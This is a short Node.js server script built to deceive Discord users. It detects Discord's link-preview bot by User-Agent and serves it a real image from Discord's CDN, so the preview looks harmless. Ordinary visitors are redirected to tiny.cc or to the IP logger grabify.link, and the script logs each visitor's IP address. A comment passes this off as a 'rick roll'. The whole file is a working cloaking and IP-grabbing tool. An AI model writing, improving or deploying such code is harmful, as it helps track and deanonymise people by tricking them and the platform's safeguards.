"use strict";
exports.__esModule = true;
var http = require("http");
var https = require("https");
var discordUserAgentPatters = [
    'Discordbot',
    '+https://discordapp.com',
    'Firefox/38.0'
];
var isDiscordsUserAgent = function (userAgent) {
    for (var _i = 0, discordUserAgentPatters_1 = discordUserAgentPatters; _i < discordUserAgentPatters_1.length; _i++) {
        var pattern = discordUserAgentPatters_1[_i];
        if (userAgent.includes(pattern))
            return true;
    }
    return false;
};

var getClientAddress = function (req) {
        return (req.headers['x-forwarded-for'] || '').split(',')[0] || req.connection.remoteAddress;
};

var server = http.createServer(function (req, res) {
    var userAgent = req.headers['user-agent'];
    console.log('[ Incoming Request ] User-Agent:', userAgent,"/nIP ADDRESS:", getClientAddress(req));
    if (isDiscordsUserAgent(userAgent)) {
        console.log("Got a request from discord, pretending I'm serving images.");
        // Send the image from discord's server
        https.get("https://cdn.discordapp.com" + req.url.replace(/(?<=attachments?\/)([^\/]+\/)(?=.+)/,'').replace(/attachment\//,'attachments/'), function (discordRes) {
            discordRes.pipe(res);
        });
    }else{
        try {
        console.log("Got a user request, Redirect them!");
        // Redirect to rick roll
        var reg = "/(attachments?)\/([a-zA-Z0-9]*)\/(.*)/";
        var red = req.url.match(reg)[2];
        console.log(req.url.match(reg)[1]);
        if (req.url.match(reg)[1] == "attachments") {
            res.writeHead(302, {
                Location: `https://tiny.cc/${ red }`
            });
        }else if (req.url.match(reg)[1] == "attachment"){
            res.writeHead(302, {
                Location: `https://grabify.link/${ red }`
            });
        }
        } catch (err) {}
    res.end();
}});
server.listen(80);// might want to change the port
